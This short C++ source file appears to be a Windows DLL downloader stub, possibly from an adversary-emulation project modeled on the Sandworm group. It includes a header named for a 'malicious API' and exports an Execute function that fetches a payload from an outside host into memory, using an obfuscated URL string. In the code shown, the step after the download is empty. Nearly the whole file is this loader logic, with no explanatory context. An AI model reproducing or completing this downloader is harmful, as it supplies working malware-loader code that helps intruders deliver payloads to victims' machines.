#include <Windows.h>

#include "xLibMaliciousApi.h"
#include "xOsApi.h"



#define X_EXTERN_DLL_EXPORT		extern "C" __declspec(dllexport)

#define X_PAYLOAD_URL			X_OBFUSCATED_STRING_W(L"https://ioc.ninja/sandworm-payload.pdf")



BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved)
{
	return true;
}

X_EXTERN_DLL_EXPORT void Execute()
{
	uint8_t* buffer = NULL;

	size_t size = 0;

	if (X_LIB_MALICIOUS_CALL(xDownloadToBuffer)(X_PAYLOAD_URL, &buffer, &size))
	{
		
	}
}